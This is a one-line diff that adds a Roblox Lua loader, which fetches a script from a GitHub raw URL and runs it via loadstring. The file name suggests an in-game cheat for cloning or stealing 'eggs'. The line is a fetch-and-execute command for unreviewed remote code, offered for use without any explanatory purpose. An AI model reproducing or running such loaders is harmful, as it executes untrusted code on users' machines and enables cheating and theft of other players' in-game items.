@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/clone-to-steal-eggs-spam5-rv2z90x8o5euwe.lua"))()
